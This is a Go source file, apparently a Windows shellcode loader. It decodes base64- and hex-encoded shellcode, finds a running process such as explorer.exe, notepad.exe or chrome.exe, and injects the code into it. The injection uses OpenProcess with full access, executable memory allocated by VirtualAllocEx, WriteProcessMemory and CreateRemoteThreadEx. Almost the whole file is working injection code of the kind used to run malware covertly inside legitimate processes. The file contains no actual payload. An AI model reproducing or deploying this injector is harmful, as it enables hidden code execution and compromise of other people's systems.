package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"github.com/TheTitanrain/w32"
	"log"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	PROCESS_ALL_ACCESS     = 0x1F0FFF //OpenProcess中的第一个参数，获取最大权限
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	//inProcessName            = "calc.exe"    //需要注入的进程，可修改
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	OpenProcess              = kernel32.NewProc("OpenProcess")
	VirtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
	WriteProcessMemory       = kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx     = kernel32.NewProc("CreateRemoteThreadEx")
	VirtualProtectEx         = kernel32.NewProc("VirtualProtectEx")
)

type ulong int32
type ulong_ptr uintptr
type PROCESSENTRY32 struct {
	dwSize              ulong
	cntUsage            ulong
	th32ProcessID       ulong
	th32DefaultHeapID   ulong_ptr
	th32ModuleID        ulong
	cntThreads          ulong
	th32ParentProcessID ulong
	pcPriClassBase      ulong
	dwFlags             ulong
	szExeFile           [260]byte
}
func getprocname(id uint32) string {
	snapshot := w32.CreateToolhelp32Snapshot(w32.TH32CS_SNAPMODULE, id)
	var me w32.MODULEENTRY32
	me.Size = uint32(unsafe.Sizeof(me))
	if w32.Module32First(snapshot, &me) {
		return w32.UTF16PtrToString(&me.SzModule[0])
	}
	return ""
}

//根据进程名称获取进程pid
func Getpid() uint32  {
	// enter target processes here, the more the better..
	target_procs := []string{"explorer.exe","notepad.exe","chrome.exe"}
	sz := uint32(1000)
	procs := make([]uint32, sz)
	var bytesReturned uint32
	for _,proc := range target_procs {
		if w32.EnumProcesses(procs, sz, &bytesReturned) {
			for _, pid := range procs[:int(bytesReturned)/4] {
				if getprocname(pid) == proc {
					fmt.Println("find!",pid)
					return pid
				} else {
					// sleep to limit cpu usage
					time.Sleep(15 * time.Millisecond)
				}
			}
		}
	}
	return 0
}


//对base64编码的shellcode进行处理
func GetShellCode(b64body string) []byte {
	shellCodeB64, err := base64.StdEncoding.DecodeString(b64body)
	if err != nil {
		fmt.Printf("[!]Error b64decoding string : %s ", err.Error())
		os.Exit(1)
	}
	//转换处理
	shellcodeHex, _ := hex.DecodeString(strings.ReplaceAll(strings.ReplaceAll(string(shellCodeB64), "\n", ""), "\\x", ""))
	return shellcodeHex
}

//根据pid获取句柄
func GetOpenProcess(dwProcessId uint32) uintptr {
	pHandle, _, _ := OpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), uintptr(0), uintptr(dwProcessId))
	return pHandle
}

//开辟内存空间执行shellcode
func injectProcessAndEx(pHandle uintptr, shellcode []byte) {
	Protect := PAGE_EXECUTE_READWRITE
	addr, _, err := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", err.Error()))
	}

	WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&Protect)))
	CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
}